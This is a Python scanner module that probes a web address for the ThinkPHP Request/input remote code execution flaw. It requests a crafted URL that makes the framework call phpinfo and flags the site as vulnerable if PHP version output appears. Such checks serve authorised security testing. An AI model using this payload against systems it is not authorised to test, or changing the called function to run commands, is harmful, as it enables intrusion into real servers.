"""  
@Time: 2024/2/28 16:45 
@Auth: Y5neKO
@File: Thinkphp_request_input_rce.py 
@IDE: PyCharm 
"""
import requests
import urllib.parse


def run(url, timeout):
    result = {
        'name': 'Thinkphp_request_input_rce',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1')
        req = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
        req2 = requests.get(url, headers=headers, timeout=timeout, verify=False)
        if "PHP Version" in req.text and "PHP Version" not in req2.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = vurl
        return result
    except Exception as e:
        print(e)
        return result
